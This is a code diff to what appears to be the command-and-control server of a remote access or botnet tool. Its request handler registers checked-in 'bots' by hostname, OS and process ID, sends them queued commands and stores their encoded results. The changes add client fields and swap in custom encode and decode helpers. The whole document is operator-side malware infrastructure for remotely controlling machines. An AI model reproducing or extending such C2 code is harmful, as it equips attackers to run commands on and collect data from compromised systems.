@@ -8,8 +8,7 @@ from threading import Thread
 from server.logger import log_time
 from server.db import update_client, cmd_check, update_results
 from server.config import CLIENT_PAGE, CLIENT_KEY, sock_close, sock_send, \
-    sock_recv, EXTERNALIP, KEY_FILE, CERT_FILE, SSL_VERSION
-from base64 import b64decode
+    sock_recv, EXTERNALIP, KEY_FILE, CERT_FILE, SSL_VERSION, cmd_decode, cmd_encode
 
 ##################################################################
 #
@@ -34,8 +33,6 @@ def convert_headers(data):
                     pass
     except Exception as e:
         if "-debug" in argv: print("[!] Error Converting Request Headers: {}".format(str(e)))
-
-    if "-debug" in argv: print("[!] Client Request to Server:\n{}".format(headers))
     return headers
 
 class request_handler():
@@ -47,6 +44,9 @@ class request_handler():
     Secret-Key: #################
     Hostname: ########
     os: ###########
+    PID: ###########
+    TYPE: ###########
+    PROTOCOL: ###########
     Data: ############# (b64 encoded)
     """
     def __init__(self, sock, addr):
@@ -89,30 +89,33 @@ class request_handler():
     def agent_handler(self, sock, request, remote_ip):
         # Main func to direct bot actions
         try:
+            # Get Client ID in DB
             id = update_client(remote_ip, request['Hostname'], request['OS'], 'Active', request['PID'], request['TYPE'], request['PROTOCOL'])
-            cmd = cmd_check(id)
             # Decode response data to perform checks, but leave encoded into DB
-            decoded_resp = b64decode(request['Data']).decode('utf-8')
+            decoded_resp = cmd_decode(request['Data'])
+            if "-debug" in argv:
+                print("[+] Response from {}({}): {}".format(request['Hostname'],request['PID'], decoded_resp.rstrip()))
 
-            # Send CMD (if applicable)
+            # Check if client in default state and CMD waiting for client
+            cmd = cmd_check(id)
             if decoded_resp == "check-in" and cmd:
                 self.send_cmd(sock, cmd)
-                if "-debug" in argv: print("[-->] Agent_handler Sending {} CMD: {}".format(request['Hostname'],cmd))
 
             # Send OK (Default)
             elif decoded_resp == "check-in":
                 return self.get_200(sock)
 
-            # If "[Client] Close" response, set as inactive in database
-            elif decoded_resp == "{} Closed".format(request['Hostname']):
-                update_client(remote_ip, request['Hostname'], request['OS'], 'Inactive')
-                update_results(id, request['Data'])
-                return self.get_200(sock)
+            # If "[Client] Close." response, set as inactive in database
+            elif decoded_resp == "{} Closed.".format(request['Hostname']):
+                try:
+                    update_results(id, request['Data'])
+                    update_client(remote_ip, request['Hostname'], request['OS'], 'Inactive', request['PID'], request['TYPE'],request['PROTOCOL'])
+                except Exception as e:
+                    print(e)
 
-            # Put encoded cient response in DB
+            # Handle client results from recent CMD
             else:
                 update_results(id, request['Data'])
-                if "-debug" in argv: print("[<--] Agent_handler Deoded Received Result {} from {}".format(decoded_resp, request['Hostname']))
                 return self.get_200(sock)
         except Exception as e:
             self.get_200(sock)
